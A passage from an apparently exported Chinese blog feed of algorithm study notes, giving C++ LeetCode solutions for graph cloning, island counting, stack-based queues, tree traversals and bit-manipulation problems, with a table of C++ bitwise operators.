{</span><br><span class="line">                st.<span class="built_in">push</span>(cur);</span><br><span class="line">                cur=cur-&gt;left;</span><br><span class="line">            }</span><br><span class="line">            cur=st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            ans.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">            cur=cur-&gt;right;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">         </span><br><span class="line">       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="133-克隆图"><a href="#133-克隆图" class="headerlink" title="133. 克隆图"></a><a href="https://leetcode-cn.com/problems/clone-graph/">133. 克隆图</a></h4><blockquote><p>给你无向 <strong><a href="https://baike.baidu.com/item/%E8%BF%9E%E9%80%9A%E5%9B%BE/6460995?fr=aladdin">连通</a></strong> 图中一个节点的引用，请你返回该图的 <a href="https://baike.baidu.com/item/%E6%B7%B1%E6%8B%B7%E8%B4%9D/22785317?fr=aladdin"><strong>深拷贝</strong></a>（克隆）。</p><p>图中的每个节点都包含它的值 <code>val</code>（<code>int</code>） 和其邻居的列表（<code>list[Node]</code>）。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> {</span><br><span class="line"> <span class="keyword">public</span> <span class="type">int</span> val;</span><br><span class="line"> <span class="keyword">public</span> List&lt;Node&gt; neighbors;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node {</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    vector&lt;Node*&gt; neighbors;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node() {</span></span><br><span class="line"><span class="comment">        val = 0;</span></span><br><span class="line"><span class="comment">        neighbors = vector&lt;Node*&gt;();</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val) {</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        neighbors = vector&lt;Node*&gt;();</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val, vector&lt;Node*&gt; _neighbors) {</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        neighbors = _neighbors;</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">};</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;Node*,Node*&gt; mp;</span><br><span class="line">    <span class="function">Node* <span class="title">cloneGraph</span><span class="params">(Node* node)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        <span class="keyword">if</span>(mp.<span class="built_in">count</span>(node))</span><br><span class="line">            <span class="keyword">return</span> mp[node];</span><br><span class="line">        <span class="type">const</span> <span class="keyword">auto</span> newnode=<span class="keyword">new</span> <span class="built_in">Node</span>(node-&gt;val);</span><br><span class="line">        mp[node]=newnode;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> n:node-&gt;neighbors)</span><br><span class="line">        {</span><br><span class="line">            mp[node]-&gt;neighbors.<span class="built_in">push_back</span>(<span class="built_in">cloneGraph</span>(n));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> mp[node];</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title="200. 岛屿数量"></a><a href="https://leetcode-cn.com/problems/number-of-islands/">200. 岛屿数量</a></h4><blockquote><p>给你一个由 ‘1’（陆地）和 ‘0’（水）组成的的二维网格，请你计算网格中岛屿的数量。</p><p>岛屿总是被水包围，并且每座岛屿只能由水平方向或竖直方向上相邻的陆地连接形成。</p><p>此外，你可以假设该网格的四条边均被水包围。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">numIslands</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; grid)</span> </span>{</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; grid.<span class="built_in">size</span>(); i++){</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>(); j++){</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">'1'</span>){</span><br><span class="line">                    <span class="built_in">dfs</span>(grid, i, j);</span><br><span class="line">                    count++;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">   }</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; grid, <span class="type">int</span> i, <span class="type">int</span> j)</span></span>{</span><br><span class="line">       <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt;= grid.<span class="built_in">size</span>() || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>() || grid[i][j] != <span class="string">'1'</span>){</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       }</span><br><span class="line"></span><br><span class="line">       grid[i][j] = <span class="string">'2'</span>;</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i + <span class="number">1</span>, j);</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i - <span class="number">1</span>, j);</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i, j + <span class="number">1</span>);</span><br><span class="line">       <span class="built_in">dfs</span>(grid, i, j - <span class="number">1</span>);</span><br><span class="line">   }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="84-柱状图中最大的矩形"><a href="#84-柱状图中最大的矩形" class="headerlink" title="84. 柱状图中最大的矩形"></a><a href="https://leetcode-cn.com/problems/largest-rectangle-in-histogram/">84. 柱状图中最大的矩形</a></h4><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><h4 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232. 用栈实现队列"></a><a href="https://leetcode-cn.com/problems/implement-queue-using-stacks/">232. 用栈实现队列</a></h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; s1,s2;</span><br><span class="line">    <span class="type">int</span> front;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="built_in">MyQueue</span>() {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(s<span class="number">1.</span><span class="built_in">empty</span>())</span><br><span class="line">            front=x;</span><br><span class="line">        s<span class="number">1.</span><span class="built_in">push</span>(x);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(s<span class="number">2.</span><span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">while</span>(!s<span class="number">1.</span><span class="built_in">empty</span>())</span><br><span class="line">            {</span><br><span class="line">                s<span class="number">2.</span><span class="built_in">push</span>(s<span class="number">1.</span><span class="built_in">top</span>());</span><br><span class="line">                s<span class="number">1.</span><span class="built_in">pop</span>();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="type">int</span> ret =s<span class="number">2.</span><span class="built_in">top</span>();</span><br><span class="line">        s<span class="number">2.</span><span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the front element. */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(!s<span class="number">2.</span><span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> s<span class="number">2.</span><span class="built_in">top</span>();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> front;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(s<span class="number">1.</span><span class="built_in">empty</span>()&amp;&amp;s<span class="number">2.</span><span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue* obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;peek();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><h4 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h4><blockquote><p>给你一个二叉树，请你返回其按 <strong>层序遍历</strong> 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">           <span class="type">int</span> currentLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">           vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLevelSize;i++)</span><br><span class="line">           {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                level.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);               </span><br><span class="line">           }</span><br><span class="line">           res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="542-01-矩阵"><a href="#542-01-矩阵" class="headerlink" title="542. 01 矩阵"></a><a href="https://leetcode-cn.com/problems/01-matrix/">542. 01 矩阵</a></h4>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 栈 </tag>
            
            <tag> 队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构学习笔记：二进制</title>
      <link href="/posts/48007/"/>
      <url>/posts/48007/</url>
      
        <content type="html"><![CDATA[<h1 id="常见二进制操作"><a href="#常见二进制操作" class="headerlink" title="常见二进制操作"></a>常见二进制操作</h1><h2 id="C-位运算符"><a href="#C-位运算符" class="headerlink" title="C++位运算符"></a>C++位运算符</h2><p>下表显示了 C++ 支持的位运算符。</p><p>假设如果 A = 60，且 B = 13，现在以二进制格式表示，它们如下所示：</p><p>A = 0011 1100</p><p>B = 0000 1101</p><p>则：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>&amp;</td><td>如果同时存在于两个操作数中，二进制 AND 运算符复制一位到结果中。</td><td>(A &amp; B) 将得到 12，即为 0000 1100</td></tr><tr><td>|</td><td>如果存在于任一操作数中，二进制 OR 运算符复制一位到结果中。</td><td>(A | B) 将得到 61，即为 0011 1101</td></tr><tr><td>^</td><td>如果存在于其中一个操作数中但不同时存在于两个操作数中，二进制异或运算符复制一位到结果中。</td><td>(A ^ B) 将得到 49，即为 0011 0001</td></tr><tr><td>~</td><td>二进制补码运算符是一元运算符，具有”翻转”位效果，即0变成1，1变成0。</td><td>(~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。</td></tr><tr><td>&lt;&lt;</td><td>二进制左移运算符。左操作数的值向左移动右操作数指定的位数。</td><td>A &lt;&lt; 2 将得到 240，即为 1111 0000</td></tr><tr><td>&gt;&gt;</td><td>二进制右移运算符。左操作数的值向右移动右操作数指定的位数。</td><td>A &gt;&gt; 2 将得到 15，即为 0000 1111</td></tr></tbody></table><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>a=0^a=a^0</p><p>0=a^a</p><p>由上面两个推导出：a=a^b^b</p><h2 id="交换两个数"><a href="#交换两个数" class="headerlink" title="交换两个数"></a>交换两个数</h2><p>a=a^b</p><p>b=a^b</p><p>a=a^b</p><h2 id="移除最后一个-1"><a href="#移除最后一个-1" class="headerlink" title="移除最后一个 1"></a>移除最后一个 1</h2><p>a=n&amp;(n-1)</p><h2 id="获取最后一个-1"><a href="#获取最后一个-1" class="headerlink" title="获取最后一个 1"></a>获取最后一个 1</h2><p>diff=(n&amp;(n-1))^n</p><h1 id="常见题目"><a href="#常见题目" class="headerlink" title="常见题目"></a>常见题目</h1><h4 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a href="https://leetcode-cn.com/problems/single-number/">136. 只出现一次的数字</a></h4><blockquote><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p>说明：</p><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p><p>示例 1:</p><p>输入: [2,2,1]<br>输出: 1<br>示例 2:</p><p>输入: [4,1,2,1,2]<br>输出: 4</p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/48007/image-20200807111500764.png" alt="image-20200807111500764"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/48007/image-20200807111619453.png" alt="image-20200807111619453"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>{</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> num:nums)</span><br><span class="line">        {</span><br><span class="line">            ret^=num;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="137-只出现一次的数字-II"><a href="#137-只出现一次的数字-II" class="headerlink" title="137. 只出现一次的数字 II"></a><a href="https://leetcode-cn.com/problems/single-number-ii/">137. 只出现一次的数字 II</a></h4><blockquote><p>给定一个<strong>非空</strong>整数数组，除了某个元素只出现一次以外，其余每个元素均出现了三次。找出那个只出现了一次的元素。</p><p><strong>说明：</strong></p><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [2,2,3,2]</span><br><span class="line">输出: 3</span><br></pre></td></tr></tbody></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [0,1,0,1,0,1,99]</span><br><span class="line">输出: 99</span><br></pre></td></tr></tbody></table></figure></blockquote><h5 id="遍历统计"><a href="#遍历统计" class="headerlink" title="遍历统计"></a>遍历统计</h5><p>如果所有数字都出现了 3 次，那么每一列的 1 的个数就一定是 3 的倍数。之所以有的列不是 3 的倍数，就是因为只出现了 1 次的数贡献出了 1。所以所有不是 3 的倍数的列写 1，其他列写 0 ，就找到了这个出现 1 次的数。</p><blockquote><p>假如例子是 1 2 6 1 1 2 2 3 3 3, 3 个 1, 3 个 2, 3 个 3,1 个 6<br>1 0 0 1<br>2 0 1 0<br>6 1 1 0<br>1 0 0 1<br>1 0 0 1<br>2 0 1 0<br>2 0 1 0<br>3 0 1 1<br>3 0 1 1<br>3 0 1 1<br>看最右边的一列 1001100111 有 6 个 1<br>再往前看一列 0110011111 有 7 个 1<br>再往前看一列 0010000 有 1 个 1<br>我们只需要把是 3 的倍数的对应列写 0，不是 3 的倍数的对应列写 1<br>也就是 1 1 0,也就是 6。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>{</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums.<span class="built_in">size</span>();j++)</span><br><span class="line">            {</span><br><span class="line">                sum+=(nums[j]&gt;&gt;i)&amp;<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">            ret^=(sum%<span class="number">3</span>)&lt;&lt;i;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="有限状态自动机"><a href="#有限状态自动机" class="headerlink" title="有限状态自动机"></a>有限状态自动机</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构学习笔记：二叉树</title>
      <link href="/posts/49261/"/>
      <url>/posts/49261/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h3><p>前序遍历：先访问根节点，再前序遍历左子树，再前序遍历右子树 中序遍历：先中序遍历左子树，再访问根节点，再中序遍历右子树 后序遍历：先后序遍历左子树，再后序遍历右子树，再访问根节点</p><p>注意点</p><ul><li>以根访问顺序决定是什么遍历</li><li>左子树都是优先右子树</li></ul><h4 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h4><p>例题：<a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/">https://leetcode-cn.com/problems/binary-tree-preorder-traversal/</a></p><h5 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line"><span class="comment">// 先访问根再访问左右</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">preorderTraversal</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">preorderTraversal</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="非递归"><a href="#非递归" class="headerlink" title="非递归"></a>非递归</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 